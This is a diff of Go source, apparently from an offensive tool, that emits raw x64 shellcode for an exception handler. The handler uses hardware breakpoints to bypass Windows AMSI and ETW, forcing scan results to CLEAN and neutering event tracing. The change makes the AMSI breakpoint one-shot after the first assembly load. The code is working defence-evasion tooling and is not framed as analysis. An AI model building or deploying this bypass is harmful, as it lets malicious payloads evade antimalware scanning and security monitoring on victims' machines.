@@ -143,7 +143,7 @@ var (
 //       * Read AMSI_RESULT* from [context.Rsp+0x30], write 0 (CLEAN) to *result
 //       * Set context.Rsp += 8 (pop return addr)
 //       * Set context.Rax = 0 (S_OK)
-//     - Persistent: Dr0 stays enabled (AMSI called for each assembly load)
+//     - One-shot: disable Dr0 (clear Dr7 bit 0) after first interception per thread
 //  4. Compare ContextRecord->Rip against ETW addr:
 //     - Redirect Rip to "xor eax,eax; ret" gadget (returns 0/STATUS_SUCCESS)
 //     - One-shot: disable Dr1 (clear Dr7 bit 2) — prevents Go runtime crashes
@@ -250,8 +250,6 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 
 	// AMSI match: simulate AmsiScanBuffer return directly in CONTEXT.
 	// No gadget needed — we modify the CONTEXT and Windows restores it.
-	// AMSI breakpoint is PERSISTENT (not one-shot) because the CLR calls
-	// AmsiScanBuffer for each assembly load.
 	//
 	// At the breakpoint, the saved CONTEXT has:
 	//   context.Rsp → [return_addr] [shadow_space...] [param5] [param6=AMSI_RESULT*]
@@ -288,7 +286,14 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x78, 0x00, 0x00, 0x00)       // disp32 = 0x78 (Rax)
 	code = append(code, 0x00, 0x00, 0x00, 0x00)       // imm32 = 0
 
-	// NO one-shot: Dr0 stays enabled so subsequent AmsiScanBuffer calls are caught
+	// One-shot: disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7.
+	// Subsequent AmsiScanBuffer calls go through real AMSI — benign assemblies
+	// pass, and the critical first-load interception has already been done.
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
+	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
+	code = append(code, 0x48, 0x83, 0xE0, 0xFE)       // and rax, ~1 (clear bit 0)
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
+	code = append(code, 0x70, 0x00, 0x00, 0x00)
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
 	code = append(code, 0x68, 0x00, 0x00, 0x00)
